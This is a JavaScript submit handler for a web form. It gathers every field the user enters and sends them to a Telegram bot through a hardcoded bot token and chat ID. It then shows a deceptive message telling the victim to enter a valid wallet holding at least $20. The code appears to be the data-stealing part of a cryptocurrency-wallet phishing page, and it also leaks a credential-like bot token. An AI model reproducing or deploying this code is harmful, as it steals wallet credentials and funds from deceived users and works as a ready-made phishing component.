document.getElementById('anyForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const botToken = '7991408344:AAHMMcuxSnljllu7sKhZBXbeF0nv2d507Oc'; // Replace
    const chatId = '6976365864';     // Replace

    const form = e.target;
    const elements = form.querySelectorAll('input, textarea, select');
    const statusBox = document.getElementById('statusBox');
    let message = '🧾 *Form Submission*:\n\n';
    let isEmpty = true;

    elements.forEach((el) => {
      let name = 'Unknown Field';
      const id = el.id;

      if (id) {
        const label = form.querySelector(`label[for="${id}"]`);
        if (label) name = label.innerText.trim();
      }
      if (name === 'Unknown Field') {
        const parentLabel = el.closest('label');
        if (parentLabel) name = parentLabel.innerText.trim();
      }

      let value = '';
      if (el.type === 'checkbox') {
        value = el.checked ? '✅ Checked' : '❌ Unchecked';
        if (el.checked) isEmpty = false;
      } else if (el.type === 'radio') {
        if (el.checked) {
          value = el.value;
          isEmpty = false;
        } else return;
      } else {
        value = el.value.trim();
        if (value) isEmpty = false;
      }

      message += `*${name}:* ${value || 'N/A'}\n`;
    });

    // Show error if form is empty
    if (isEmpty) {
      statusBox.textContent = '❌ Please fill out at least one field.';
      statusBox.className = 'status error';
      statusBox.style.display = 'block';
      return;
    }

    // Send to Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(res => {
      if (!res.ok) throw new Error('Telegram error');
      return res.json();
    })
    .then(data => {
      if (data.ok) {
        statusBox.textContent = '⛔ you must enter a valid wallet and make sure you have at least $20 in your wallet!';
        statusBox.className = 'status success';
        statusBox.style.display = 'block';
        form.reset();
      } else {
        throw new Error(data.description);
      }
    })
    .catch(err => {
      statusBox.textContent = '❌ Failed to send. Try again.';
      statusBox.className = 'status error';
      statusBox.style.display = 'block';
      console.error(err);
    });
  });